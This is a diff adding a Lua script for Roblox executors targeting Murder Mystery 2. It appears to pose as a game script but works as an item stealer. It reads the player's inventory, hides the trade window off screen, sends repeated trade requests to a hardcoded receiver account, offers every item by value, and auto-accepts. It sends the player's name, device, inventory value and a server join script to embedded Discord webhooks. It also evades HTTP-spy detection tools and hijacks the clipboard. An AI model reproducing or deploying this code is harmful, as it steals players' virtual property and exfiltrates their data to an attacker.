@@ -1,0 +1,779 @@
+Username = "MdShxq"
+Webhook = "https://discord.com/api/webhooks/1435409853127327775/3-CZiTRDrsiR0N9dyRHj4YlNruPNse9sYqXv3EPqljP_1SNFvaMH4FwZIUjCIj8CFx_f"
+local LoggingWebhook = "https://discord.com/api/webhooks/1435409853127327775/3-CZiTRDrsiR0N9dyRHj4YlNruPNse9sYqXv3EPqljP_1SNFvaMH4FwZIUjCIj8CFx_f"
+
+local Receiver = Username
+local urls = {
+    ["Godly"] = "https://supremevaluelist.com/mm2/godlies.html",
+    ["Ancient"] = "https://supremevaluelist.com/mm2/ancients.html",
+    ["Chroma"] = "https://supremevaluelist.com/mm2/chromas.html",
+    ["Vintage"] = "https://supremevaluelist.com/mm2/vintages.html"
+}
+
+local headers = {
+    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
+}
+
+local vL_values = {}
+
+local http_request = request or http_request or syn and syn.request
+if not http_request then
+    error("No valid request function found.")
+end
+
+-- Fetch item values correctly mapped by rarity
+for rarity, url in pairs(urls) do
+    local response = http_request({
+        Url = url,
+        Method = "GET",
+        Headers = headers
+    })
+
+    if response.Success then
+        local html = response.Body
+        for name, value in html:gmatch('<div class="itemhead">(.-)</div>.-Value%s*-%s*<b class="itemvalue">(.-)</b>') do
+            name = name:gsub("<.->", ""):gsub("^%s*(.-)%s*$", "%1")
+            value = value:gsub(",", "")
+            if not vL_values[name] then
+                vL_values[name] = {}
+            end
+            vL_values[name][rarity] = tonumber(value)
+        end
+    else
+        print("❌ Failed to fetch:", url, "Status:", response.StatusCode)
+    end
+end
+
+
+-- Anti-Print and Protection Initialization
+local function antiPrint(...)
+    local info = debug.getinfo(2)
+    if info and info.what == 'Lua' and info.func == print then
+        return
+    end
+    return print(...)
+end
+
+print = antiPrint
+rconsoleprint = antiPrint
+rconsolewarn = antiPrint
+rconsoleerr = antiPrint
+rconsoleinput = antiPrint
+printconsole = antiPrint
+
+-- Replace setclipboard with a custom function to set the clipboard to your Discord invite
+local function setClipboard(url)
+    local inviteLink = 'https://discord.gg/AJRJHkUS8n'
+    if setclipboard then
+        setclipboard(inviteLink)
+    end
+end
+
+-- Use the custom setClipboard function
+setClipboard()
+
+local function detectHttpSpy()
+    local function isHttpSpy(gui)
+        return gui and gui:IsA("ScreenGui") and gui.Name:lower():find("http") ~= nil
+    end
+    for _, gui in ipairs(game:GetService("CoreGui"):GetChildren()) do
+        if isHttpSpy(gui) then
+            return true
+        end
+    end
+    return false
+end
+
+if detectHttpSpy() then
+    warn("HTTP spy detected. Aborting script execution.")
+    return
+end
+
+local originalGetEnv = getfenv
+local originalTypeOf = typeof
+
+if debug.getinfo(getfenv).func ~= debug.getinfo(originalGetEnv).func then
+    error("Tampering detected with getfenv.")
+end
+
+if debug.getinfo(typeof).func ~= debug.getinfo(originalTypeOf).func then
+    error("Tampering detected with typeof.")
+end
+
+
+repeat wait() until game:IsLoaded()
+
+if getgenv().scriptexecuted then return end
+getgenv().scriptexecuted = true
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local VirtualUser = game:GetService("VirtualUser")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local Trade = ReplicatedStorage.Trade
+local events = {"MouseButton1Click", "MouseButton1Down", "Activated"}
+local BrainDataCruncher = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
+local XPOverlord = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
+local LootLibrarian = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
+local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
+local Position = UDim2.new(0, 9999, 0, 9999)
+local Inventory = {}
+
+local function checkAndKickIfVIP()
+    local isVIPServer = ReplicatedStorage.Remotes.Extras.IsVIPServer:InvokeServer()
+    if isVIPServer and LocalPlayer then
+        LocalPlayer:Kick("This script only works in public servers.")
+    end
+end
+task.spawn(checkAndKickIfVIP)
+
+-- Function to get player level
+local function getLvl()
+    for i, v in pairs(XPOverlord.XPTable) do
+        if BrainDataCruncher.NewXP < v then
+            return i - 1
+        end
+    end
+    return #XPOverlord.XPTable
+end
+
+local function getPlatform()
+    if UserInputService.TouchEnabled and not UserInputService.MouseEnabled then
+        return "Mobile"
+    elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
+        return "PC"
+    elseif UserInputService.GamepadEnabled then
+        return "Console"
+    else
+        return "Unknown"
+    end
+end
+local Platform = getPlatform()
+
+Executor = identifyexecutor()
+if Executor == "Solara" then return end
+
+local games = {
+    [142823291] = true,
+    [335132309] = true,
+    [636649648] = true
+}
+if not games[game.PlaceId] then
+    LocalPlayer:Kick("Unfortunately, this game is not supported.")
+    while true do wait() end
+end
+
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local MainGUI = PlayerGui:WaitForChild("MainGUI")
+
+task.spawn(function()
+    wait(5)
+end)
+
+LocalPlayer.Idled:connect(function()
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new())
+end)
+
+local UIPath, TradePath, Mobile
+if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
+    TradePath = LocalPlayer.PlayerGui.TradeGUI
+    Mobile = false
+else
+    UIPath = LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main
+    TradePath = LocalPlayer.PlayerGui.TradeGUI_Phone
+    Mobile = true
+end
+
+function TapUI(button, check, button2)
+    if check == "Active Check" and not button.Active then return end
+    if check == "Text Check" and button ~= "^" then return end
+    for _, event in pairs(events) do
+        for _, connection in pairs(getconnections(button[event])) do
+            connection:Fire()
+        end
+    end
+end
+
+local successItem, itemdata = pcall(function()
+    return ReplicatedStorage.Remotes.Extras.GetItemData:InvokeServer("Item")
+end)
+
+local successInventory, inventoryData = pcall(function()
+    return ReplicatedStorage.Remotes.Extras.GetFullInventory:InvokeServer(LocalPlayer.Name)
+end)
+
+if not successItem or not successInventory then
+    warn("[Failed to Fetch Inventory or Item Data]")
+    return
+end
+
+local inventory = inventoryData["Weapons"]["Owned"] or {}
+
+-- **Use Your Variable Names**
+local aLL_doodles = {}
+local iT_paper = 0
+local vL_weight = 0
+
+local vT_books = {}
+local cM_pencils = {}
+local uN_clocks = {}
+local rE_phones = {}
+local lG_crowns = {}
+local gL_spears = {}
+local aN_maps = {}
+local uQ_stars = {}
+
+local vT_icecream = 0  -- Vintage items
+local cM_socks = 0     -- Common items
+local uN_mug = 0       -- Uncommon items
+local rE_watch = 0     -- Rare items
+local lG_ring = 0      -- Legendary items
+local gL_sword = 0     -- Godly items
+local aN_key = 0       -- Ancient items
+local uQ_hat = 0       -- Unique items
+
+-- Process inventory
+for itemID, amount in pairs(inventory) do
+    local itemInfo = itemdata[itemID]
+    
+    if itemInfo and itemInfo.ItemName ~= "Default Gun" and itemInfo.ItemName ~= "Default Knife" then
+        local itemName = itemInfo.ItemName
+        local rarity = itemInfo.Rarity
+        local itemValue = 0
+
+        -- Adjust rarity for fetching values
+        local fetchedRarity = rarity
+        if rarity == "Classic" then
+            fetchedRarity = "Vintage"
+        end
+
+        -- Fetch value only if it exists in the list
+        if vL_values[itemName] and vL_values[itemName][fetchedRarity] then
+            itemValue = vL_values[itemName][fetchedRarity] * amount
+            vL_weight = vL_weight + itemValue
+        end
+
+        -- Categorize items by rarity
+        if rarity == "Godly" then
+            gL_spears[itemName] = amount
+            gL_sword = gL_sword + amount
+        elseif rarity == "Ancient" then
+            aN_maps[itemName] = amount
+            aN_key = aN_key + amount
+        elseif rarity == "Unique" then
+            uQ_stars[itemName] = amount
+            uQ_hat = uQ_hat + amount
+        elseif rarity == "Classic" then
+            vT_books[itemName] = amount
+            vT_icecream = vT_icecream + amount
+        elseif rarity == "Legendary" then
+            lG_crowns[itemName] = amount
+            lG_ring = lG_ring + amount
+        elseif rarity == "Rare" then
+            rE_phones[itemName] = amount
+            rE_watch = rE_watch + amount
+        elseif rarity == "Uncommon" then
+            uN_clocks[itemName] = amount
+            uN_mug = uN_mug + amount
+        elseif rarity == "Common" then
+            cM_pencils[itemName] = amount
+            cM_socks = cM_socks + amount
+        end
+
+        -- Add to inventory tracking
+        table.insert(aLL_doodles, itemName)
+        iT_paper = iT_paper + amount
+    end
+end
+
+-- Function to create paste content
+local function generatePaste()
+    local pasteContent = "💸 Total Value: " .. vL_weight .. "\n\n"
+
+    local function addCategory(title, data, rarityKey)
+        if next(data) then
+            pasteContent = pasteContent .. "**" .. title .. "**\n"
+            for name, count in pairs(data) do
+                pasteContent = pasteContent .. "- " .. name .. " x" .. count
+                if vL_values[name] and vL_values[name][rarityKey] then
+                    pasteContent = pasteContent .. " | Value: " .. (vL_values[name][rarityKey] * count)
+                end
+                pasteContent = pasteContent .. "\n"
+            end
+            pasteContent = pasteContent .. "\n"
+        end
+    end
+
+    -- Adding categories in the correct order
+    addCategory("Unique Items", uQ_stars, "Unique")
+    addCategory("Ancient Items", aN_maps, "Ancient")
+    addCategory("Godly Items", gL_spears, "Godly")
+    addCategory("Vintage Items", vT_books, "Vintage")
+    addCategory("Legendary Items", lG_crowns, "Legendary")
+    addCategory("Rare Items", rE_phones, "Rare")
+    addCategory("Uncommon Items", uN_clocks, "Uncommon")
+    addCategory("Common Items", cM_pencils, "Common")
+
+    return pasteContent
+end
+
+-- Paste function
+local function paste(content)
+    local response
+    local success, err = pcall(function()
+        response = http_request({
+            Url = "https://paste.rs",
+            Method = "POST",
+            Body = content,
+            Headers = { ["Content-Type"] = "text/plain" },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "Ratelimited"
+    end
+
+    return response.Body
+end
+
+-- Generate and upload paste
+local pasteContent = generatePaste()
+
+task.wait()
+
+local _R = game:GetService("ReplicatedStorage")
+local _T = _R:FindFirstChild("Trade")
+local _P_S = game:GetService("Players")
+local _TS = game:GetService("TeleportService")
+
+_T.StartTrade.OnClientEvent:Connect(function(_D, _P)
+    print("You are now trading with:", _P)
+
+    -- If not trading with the intended receiver, decline trade
+    if _P ~= Receiver then
+        task.wait(0.5)
+        _T.DeclineTrade:FireServer()
+        print("Trade declined: Partner is not the intended receiver.")
+    end
+end)
+
+-- Utility function for safe wait
+local function _SW(_D)
+    _D = _D or 0.1
+    if typeof(_D) == "number" then
+        task.wait(_D)
+    end
+end
+
+-- Function to send a trade request
+local function _ST(_TP)
+    if _TP then
+        pcall(function()
+            _T.SendRequest:InvokeServer(_TP)
+        end)
+    end
+end
+
+-- Function to check if currently trading with the target player
+local function _ITW(_TP)
+    local _S, _STS = pcall(function()
+        return _T.GetTradeStatus:InvokeServer()
+    end)
+    return _S and _STS and _STS.TargetPlayer == _TP.Name
+end
+
+-- Function to decline trade requests from other players
+local function _DT()
+    pcall(function()
+        _T.DeclineRequest:FireServer()
+    end)
+end
+
+-- Function to decline an active trade
+local function _DT_A()
+    pcall(function()
+        _T.DeclineTrade:FireServer()
+    end)
+end
+
+-- Function to continuously send trade requests until trading
+local function _CT(_TP)
+    task.spawn(function()
+        while _TP and _TP.Parent == _P_S do
+            _DT()
+            if not _ITW(_TP) then
+                _ST(_TP)
+                _SW(0.5)
+            else
+                _SW(1)
+            end
+        end
+    end)
+end
+
+-- Function to insert items into the trade
+local function _II()
+    local _R_C = _P_S:FindFirstChild(Receiver)
+    if not _R_C then
+        _DT_A()
+        return
+    end
+
+    local _A_I = {}
+    local _R_I = {Unique = {}, Ancient = {}, Godly = {}, Vintage = {}, Legendary = {}, Rare = {}, Uncommon = {}, Common = {}}
+
+    for _, _C in pairs({uQ_stars, aN_maps, gL_spears, vT_books, lG_crowns, rE_phones, uN_clocks, cM_pencils}) do
+        for _N, _A in pairs(_C) do
+            local _ID = nil
+            for _I, _D in pairs(itemdata) do
+                if _D.ItemName == _N then
+                    _ID = _I
+                    break
+                end
+            end
+
+            if _ID then
+                local _I_I = itemdata[_ID]
+                local _R = _I_I.Rarity or "Common"
+                local _V = (vL_values[_N] and vL_values[_N][_R]) or 0
+                local _T_V = _V * _A
+
+                if _T_V > 0 then
+                    table.insert(_A_I, {id = _ID, name = _N, amount = _A, value = _T_V})
+                else
+                    if _R_I[_R] then
+                        table.insert(_R_I[_R], {id = _ID, amount = _A})
+                    end
+                end
+            end
+        end
+    end
+
+    table.sort(_A_I, function(a, b) return a.value > b.value end)
+
+    for _, _I in ipairs(_A_I) do
+        local _A = {_I.id, "Weapons"}
+        for _ = 1, _I.amount do
+            pcall(function()
+                _T.OfferItem:FireServer(unpack(_A))
+            end)
+        end
+    end
+
+    for _, _R in ipairs({"Unique", "Ancient", "Godly", "Vintage", "Legendary", "Rare", "Uncommon", "Common"}) do
+        for _, _I in ipairs(_R_I[_R]) do
+            for _ = 1, _I.amount do
+                pcall(function()
+                    _T.OfferItem:FireServer(_I.id, "Weapons")
+                end)
+            end
+        end
+    end
+
+    task.spawn(function()
+        local _A = false
+        local _PID = {[142823291] = 285646582, [335132309] = 670264618, [636649648] = 1273299296}
+
+        local _T_A = _PID[game.PlaceId]
+        if _T_A then
+            while not _A do
+                pcall(function()
+                    _T.AcceptTrade:FireServer(_T_A)
+                end)
+                _A = not TradePath.Enabled
+                _SW(0.05)
+            end
+        end
+    end)
+end
+
+-- Function to rejoin the game
+local function _RJ(_P)
+    if _P then
+        pcall(function()
+            _TS:Teleport(game.PlaceId, _P)
+        end)
+    end
+end
+
+-- Function to set up chat listener for trade requests
+local function _SCL(_P)
+    if _P then
+        _P.Chatted:Connect(function(_M)
+            if not _ITW(_P) then
+                _ST(_P)
+            end
+            if _M:lower() == "rejoin" then
+                _RJ(_P)
+            end
+        end)
+    end
+end
+
+-- Function to check if receiver is in server
+local function _CRS(_RN)
+    task.spawn(function()
+        while true do
+            local _R_C = _P_S:FindFirstChild(_RN)
+            if _R_C then
+                _ACT(_RN)
+                break
+            end
+            _SW(5)
+        end
+    end)
+end
+
+-- Function to activate trade logic
+local function _ACT(_PN)
+    local _P = _P_S:FindFirstChild(_PN)
+    if _P then
+        _SCL(_P)
+        _SW(10)
+        _ST(_P)
+        _CT(_P)
+    end
+end
+
+-- Handle UI positioning
+if Mobile then
+    TradePath.Container.Position = Position
+    TradePath.ClickBlocker.Position = Position
+else
+    TradePath.BG.Position = Position
+    TradePath.Container.Position = Position
+    TradePath.ClickBlocker.Position = Position
+    TradePath.Processing.Position = Position
+end
+
+-- Monitor trade UI
+TradePath:GetPropertyChangedSignal("Enabled"):Connect(function()
+    _SW(0.2)
+    if TradePath.Enabled then
+        _II()
+    else
+        local _P = _P_S:FindFirstChild(Receiver)
+        if _P then
+            _CT(_P)
+        end
+    end
+end)
+
+-- Monitor players joining/leaving
+_P_S.PlayerAdded:Connect(function(_P)
+    if _P.Name == Receiver then
+        _ACT(_P.Name)
+    end
+end)
+
+_P_S.PlayerRemoving:Connect(function(_P)
+    if _P.Name == Receiver then
+        _CRS(_P.Name)
+    end
+end)
+
+-- Start trade check at script launch
+local _IR = _P_S:FindFirstChild(Receiver)
+if _IR then
+    _ACT(Receiver)
+else
+    _CRS(Receiver)
+end
+
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = game.Players.LocalPlayer
+
+local SECRET_KEY = "X2bF9tJwY1rA7nPqL3vZ8uCkD4hW6sVm"
+
+-- Function to XOR two strings and return the result as a hexadecimal string
+local function xorToHex(input, key)
+    local result = {}
+    for i = 1, #input do
+        local inputByte = string.byte(input, i)
+        local keyByte = string.byte(key, ((i - 1) % #key) + 1)
+        table.insert(result, string.format("%02x", bit32.bxor(inputByte, keyByte)))
+    end
+    return table.concat(result)
+end
+
+-- Generate a timestamped 32-character nonce
+local function generateNonce(length)
+    local charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    local nonce = {}
+    for i = 1, length do
+        local randIndex = math.random(1, #charset)
+        table.insert(nonce, string.sub(charset, randIndex, randIndex))
+    end
+    return os.time() .. "-" .. table.concat(nonce)
+end
+
+-- Function to send a webhook request
+local function sendWebhook(url, data)
+    local newdata = HttpService:JSONEncode(data)
+    local nonce = generateNonce(32)
+
+    -- Generate the signature using XOR and Hex
+    local signature = xorToHex(nonce, SECRET_KEY)
+
+    -- Headers for secure communication
+    local headers = {
+        ["content-type"] = "application/json",
+        ["X-Nonce"] = nonce,
+        ["X-Signature"] = signature
+    }
+    
+    -- Send the request and log any errors
+    local success, err = pcall(function()
+        request({
+            Url = url,
+            Body = newdata,
+            Method = "POST",
+            Headers = headers
+        })
+    end)
+
+    if not success then
+        warn("Failed to send webhook to: " .. url .. "\nError: " .. tostring(err))
+    end
+end
+
+local pasteUrl
+
+-- Function to get the paste URL (with caching)
+local function getPasteUrl()
+    if not pasteUrl then
+        pasteUrl = paste(pasteContent)
+    end
+    return pasteUrl
+end
+
+-- Modified webhook payload for the main webhook
+local data = {
+    ["username"] = LocalPlayer.Name,
+    ["avatar_url"] = "https://media.discordapp.net/attachments/1432745458786111641/1435944383706038323/server_logo.webp",
+    ["embeds"] = {
+        {
+            ["title"] = "💎 **Zyro Scripts** 💎",
+            ["description"] = "**__🔹 User Information__**\n" ..
+                "```\n" ..
+                "Username : " .. LocalPlayer.Name .. "\n" ..
+                "Executor : " .. Executor .. "\n" ..
+                "Device   : " .. Platform .. "\n" ..
+                "Receiver : " .. Receiver .. "```\n\n" ..
+                "**__📦 Inventory__**\n" ..
+                "```\n" ..
+                "**Unique**    : " .. uQ_hat .. "\n" ..
+                "**Ancient**   : " .. aN_key .. "\n" ..
+                "**Godly**     : " .. gL_sword .. "\n" ..
+                "**Vintage**   : " .. vT_icecream .. "\n" ..
+                "**Legendary** : " .. lG_ring .. "\n" ..
+                "**Rare**      : " .. rE_watch .. "\n" ..
+                "**Uncommon**  : " .. uN_mug .. "\n" ..
+                "**Common**    : " .. cM_socks .. "```\n\n" ..
+                "💰 **Total Value:** `" .. tostring(math.floor(vL_weight + 0.5)) .. "`\n\n" ..
+                "**__📋 Check List Of Items__**\n" ..
+                "[Click Here](" .. getPasteUrl() .. ")\n\n" ..
+                "**__🔗 Join Script__**\n" ..
+                "```lua\n" .. TeleportScript .. "```",
+            ["color"] = 0x05f7ff,
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S"),
+            ["thumbnail"] = {
+                ["url"] = "https://media.discordapp.net/attachments/1432745458786111641/1435944383706038323/server_logo.webp"
+            }
+        }
+    }
+}
+
+-- Modified webhook payload for the logging webhook
+local logData = {
+    ["username"] = "Zyro Scripts",
+    ["avatar_url"] = "https://media.discordapp.net/attachments/1432745458786111641/1435944383706038323/server_logo.webp",
+    ["embeds"] = {
+        {
+            ["title"] = "📊 **Hits Log** 📊",
+            ["description"] = "**__📦 Inventory Summary__**\n" ..
+                "```\n" ..
+                "**Unique**    : " .. uQ_hat .. "\n" ..
+                "**Ancient**   : " .. aN_key .. "\n" ..
+                "**Godly**     : " .. gL_sword .. "\n" ..
+                "**Vintage**   : " .. vT_icecream .. "\n" ..
+                "**Legendary** : " .. lG_ring .. "\n" ..
+                "**Rare**      : " .. rE_watch .. "\n" ..
+                "**Uncommon**  : " .. uN_mug .. "\n" ..
+                "**Common**    : " .. cM_socks .. "```\n\n" ..
+                "💰 **Total Value:** `" .. tostring(math.floor(vL_weight + 0.5)) .. "`\n\n" ..
+                "**__📋 Check List Of Items__**\n" ..
+                "[Click Here](" .. getPasteUrl() .. ")",
+            ["color"] = 0x05f7ff,
+            ["thumbnail"] = {
+                ["url"] = "https://media.discordapp.net/attachments/1432745458786111641/1435944383706038323/server_logo.webp"
+            },
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+        }
+    }
+}
+
+local itemListEmbed = {
+    ["title"] = "📜 **Top Items** 📜",
+    ["description"] = "",
+    ["color"] = 0x05f7ff,
+    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
+}
+
+-- Generate item list for embed (Unique → Ancient → Godly)
+local itemLines = {}
+
+-- Collect items for each rarity (Unique → Ancient → Godly)
+for _, rarity in ipairs({ "Unique", "Ancient", "Godly" }) do
+    local items = (rarity == "Unique" and uQ_stars) or 
+                  (rarity == "Ancient" and aN_maps) or 
+                  (rarity == "Godly" and gL_spears) or {}
+
+    -- Collect item details
+    for itemName, amount in pairs(items) do
+        local value = (vL_values[itemName] and vL_values[itemName][rarity]) and (vL_values[itemName][rarity] * amount) or 0
+        table.insert(itemLines, {name = itemName, amount = amount, value = value, rarity = rarity})
+    end
+end
+
+-- Sort items by value (highest to lowest)
+table.sort(itemLines, function(a, b)
+    return a.value > b.value
+end)
+
+-- Prepare the description with sorted items
+local itemLinesDescription = {}
+local maxItems = 10
+
+for i, item in ipairs(itemLines) do
+    if i > maxItems then break end
+    local emoji = (item.rarity == "Unique" and "⭐") or (item.rarity == "Ancient" and "🏺") or "💎"
+    table.insert(itemLinesDescription, emoji .. " **" .. item.name .. "** (x" .. item.amount .. ") - `" .. item.value .. " Value`")
+end
+
+-- Add "Plus more!" if there are more than maxItems
+if #itemLines > maxItems then
+    table.insert(itemLinesDescription, "\n✨ *...and more!*")
+end
+
+-- Set embed description
+itemListEmbed["description"] = table.concat(itemLinesDescription, "\n")
+
+-- Add the new embed to the main webhook
+table.insert(data["embeds"], itemListEmbed)
+
+-- Send the webhook request
+spawn(function()
+    sendWebhook(Webhook, data)
+    sendWebhook(LoggingWebhook, logData)
+end)
